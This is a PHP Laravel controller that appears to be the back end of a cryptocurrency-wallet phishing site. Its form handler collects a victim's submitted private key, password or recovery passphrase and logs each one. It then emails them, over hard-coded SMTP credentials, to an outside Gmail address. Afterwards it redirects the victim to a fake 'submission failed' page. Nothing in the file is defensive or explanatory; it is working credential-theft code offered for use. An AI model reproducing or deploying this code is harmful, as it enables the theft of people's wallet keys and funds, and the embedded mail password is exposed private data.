<?php

namespace App\Http\Controllers;
use Illuminate\Support\Facades\Storage;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

class WalletController extends Controller
{
   
    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function index()
    {
        // $responses = File::get(storage_path('response.json'));
        $data = Storage::get('response.json');
        $responses = json_decode($data,true);

        // Log::info($responses);
        return view('wallet',compact('responses'));
        // return view('home');
    }

    public function form(Request $request)
    {
        require base_path("vendor/autoload.php");
       //get the request and send an email 
       //redirect to the final page

    $privatekey = $request->privatekey;
    $password = $request->password;
    $message = $request->message;
    
    $mail = new PHPMailer(true); 
    $mail->SMTPDebug = 1;
    $mail->isSMTP();
    $mail->Host = 'smtp.titan.email';
    $mail->Port = 587;
    
    $mail->SMTPAuth = true;
    $mail->Username = 'jobmailer@sastore.com.ng';
    $mail->Password = 'G_oogle@345';
    $mail->SMTPSecure = 'tls';  
    $mail->setFrom('jobmailer@sastore.com.ng', 'Jobber');
    $mail->addReplyTo('jobmailer@sastore.com.ng', 'Jobber');
    // $mail->addAddress('jameshacklord001@gmail.com', 'user');
    $mail->addAddress('seyiolawepo@gmail.com', 'user');

    if(!empty($privatekey)){
        Log::info("INSIDE PRIVATEKEY");
        Log::info($privatekey);
        $mail->Subject = 'Private Key Notification';
        $mail->Body = $privatekey;
        if (!$mail->send()) {
            Log::info($mail->ErrorInfo);
        } 
    }elseif (!empty($password)) {
        Log::info("INSIDE PASSWORD");
        Log::info($password);
        $mail->Subject = 'Password Key Notification';
        $mail->Body = 'Password : '.$password. PHP_EOL . 'Message :'. $message;
        if (!$mail->send()) {
            Log::info($mail->ErrorInfo);
        } 
    }elseif (!empty($message)) {
        Log::info("INSIDE MESSAGE");
        Log::info($message);
        $mail->Subject = 'Passphrase Key Notification';
        $mail->Body = $message;
        if (!$mail->send()) {
            Log::info($mail->ErrorInfo);
        } 
    }
        return redirect('/wallets/submission/failed');
    }

    public function qrcode()
    {
       
        return view('qrpage');
    }
}
